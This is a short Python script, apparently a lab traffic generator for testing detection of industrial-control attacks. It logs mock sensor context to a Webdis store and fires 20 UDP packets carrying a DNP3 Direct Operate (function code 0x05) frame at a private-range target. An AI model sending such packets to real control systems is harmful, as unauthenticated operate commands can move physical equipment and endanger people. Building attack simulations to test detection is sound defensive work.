#!/usr/bin/env python3
import json
import os
import time
import urllib.request
import urllib.parse
import socket
import time
import uuid
import urllib.request
import urllib.parse
import json
import random
import os

def run_port_sweep_attack():
    target_ip = "10.0.30.10"
    target_port = 20000
    pivot_ip = "10.0.10.99"
    attacker_ip = "172.16.0.99"
    webdis_base = os.environ.get("WEBDIS_URL", "http://10.0.10.15:7379")
    
    # DNP3 FC 0x05 (Direct Operate) payload
    dnp3_fc5 = bytes.fromhex("0564074401000000010000008105000000")
    
    print("[+] Starting Pivot Port Sweep Attack (20 shots)...", flush=True)
    
    for i in range(20):
        src_port = random.randint(30000, 60000)
        trace_id = uuid.uuid4().hex
        parent_span_id = uuid.uuid4().hex[:16]
        
        # 1. Register Context to OOB Webdis (Mocking the IT/OT Sensor)
        raw_key = f"{pivot_ip}-{target_ip}-5"
        context_data = {
            "trace_id": trace_id,
            "parent_span_id": parent_span_id,
            "attacker_ip": attacker_ip,
            "pivot_ip": pivot_ip
        }
        payload = json.dumps(context_data)
        encoded_payload = urllib.parse.quote(payload)
        webdis_url = f"{webdis_base}/SET/{raw_key}/{encoded_payload}/EX/30"
        
        try:
            req = urllib.request.Request(webdis_url, method="GET")
            with urllib.request.urlopen(req, timeout=2) as resp:
                pass
        except Exception as e:
            print(f"[-] OOB Registration failed: {e}", flush=True)
            
        time.sleep(0.1) # Wait for Webdis registration
        
        # 2. Fire the attack packet
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("", src_port))
        sock.sendto(dnp3_fc5, (target_ip, target_port))
        sock.close()
        
        print(f"[{i+1}/20] Fired Pivot Attack {pivot_ip} -> {target_ip} (src_port: {src_port})", flush=True)
        time.sleep(2.5)

    print("[+] Attack complete.")

if __name__ == "__main__":
    run_port_sweep_attack()
